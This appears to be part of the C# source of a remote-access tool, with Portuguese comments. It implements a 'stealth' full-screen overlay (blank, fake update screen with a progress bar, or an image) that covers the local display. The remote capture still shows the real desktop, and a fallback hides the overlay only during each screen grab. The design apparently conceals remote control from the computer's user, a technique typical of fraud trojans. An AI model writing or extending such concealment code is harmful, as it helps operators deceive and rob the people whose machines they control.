            int barX = cx - barW / 2;
            int barY = (int)(textTop + titleSize.Height + subSize.Height + warnSize.Height + 46);
            using (var track = new SolidBrush(Color.FromArgb(30, 255, 255, 255)))
            {
                g.FillRectangle(track, barX, barY, barW, barH);
            }
            using (var fill = new SolidBrush(Color.FromArgb(235, 255, 255, 255)))
            {
                g.FillRectangle(fill, barX, barY, (int)(barW * percent / 100.0), barH);
            }
        }

        static Rectangle ScaleToFit(int iw, int ih, int cw, int ch)
        {
            if (iw <= 0 || ih <= 0) return new Rectangle(0, 0, cw, ch);
            double scale = Math.Min((double)cw / iw, (double)ch / ih);
            int dw = (int)(iw * scale);
            int dh = (int)(ih * scale);
            return new Rectangle((cw - dw) / 2, (ch - dh) / 2, dw, dh);
        }
    }

    // ---------------------------------------------------------------------------
    // DisplayShield — despachante para o ShieldForm. Não depende do state.Ui
    // (que nunca é instanciado no modo stealth); mantém o formulário vivo na thread
    // principal do message pump e faz marshaling via Invoke quando chamado de outras
    // threads (ReceiveLoop/Task.Run).
    // ---------------------------------------------------------------------------
    internal static class DisplayShield
    {
        static ShieldForm? form;
        static readonly object sync = new();
        static int hiddenForCapture;

        // True quando um modo de ocultação (blank/update/image) está ativo.
        // Escrita na thread do pump (Apply), lida na thread de captura (CaptureLoop).
        public static volatile bool IsActive;

        public static IntPtr WindowHandle
        {
            get { try { return form?.Handle ?? IntPtr.Zero; } catch { return IntPtr.Zero; } }
        }

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static void SetActive(bool active) => IsActive = active;

        // Chamado em Main (thread do pump) antes de Application.Run.
        public static void Init()
        {
            lock (sync)
            {
                if (form != null) return;
                form = new ShieldForm();
                _ = form.Handle;
            }
        }

        public static void Apply(string mode)
        {
            var f = form;
            if (f == null) return;
            try
            {
                if (f.InvokeRequired) f.BeginInvoke((Action)(() => f.Apply(mode)));
                else f.Apply(mode);
            }
            catch { }
        }

        // Fallback GDI: usado quando o CaptureLoop não consegue capturar via DXGI
        // Desktop Duplication (RDP, HDR, rotação de tela, GPU sem suporte). Oculta o
        // overlay apenas pelo instante da captura — a via principal (DDA) mantém o
        // overlay 100% fixo na tela e o frame remoto mostra o desktop real.
        public static void SuspendForCapture()
        {
            var h = WindowHandle;
            if (h == IntPtr.Zero) return;
            try
            {
                Nat.ShowWindow(h, SW_HIDE);
                Nat.Flush();
                hiddenForCapture = 1;
            }
            catch { }
        }

        // Re-exibe o overlay após a captura. Só re-exibe se ocultou e se o modo ainda
        // estiver ativo (evita corrida com um "off" enviado durante a captura).
        public static void ResumeAfterCapture()
        {
            if (hiddenForCapture == 0) return;
            hiddenForCapture = 0;
            var h = WindowHandle;
            if (h == IntPtr.Zero) return;
            if (!IsActive) return;
            try { Nat.ShowWindow(h, SW_SHOW); } catch { }
        }
    }
}
